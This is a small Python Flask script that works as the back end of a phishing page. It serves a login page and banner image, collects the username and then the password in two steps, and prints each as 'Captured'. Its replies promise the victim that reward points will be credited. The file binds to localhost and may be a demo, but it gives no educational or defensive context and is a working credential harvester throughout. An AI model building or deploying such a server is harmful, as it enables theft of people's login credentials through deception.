from flask import Flask, request, send_from_directory

app = Flask(__name__)

# Serve the HTML page at root
@app.route('/')
def serve_login():
    return send_from_directory('.', 'index.html')

# Serve the image
@app.route('/banner.jpeg')
def serve_image():
    return send_from_directory('.', 'banner.jpeg')

# Handle username submission
@app.route('/log-username', methods=['POST'])
def log_username():
    username = request.form.get('username')
    print(f"Captured username: {username}")
    return "Username received. Please enter your password."

# Handle password submission
@app.route('/log-password', methods=['POST'])
def log_password():
    password = request.form.get('password')
    print(f"Captured password: {password}")
    return "Thank you! Your points will be credited soon."

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=8080)
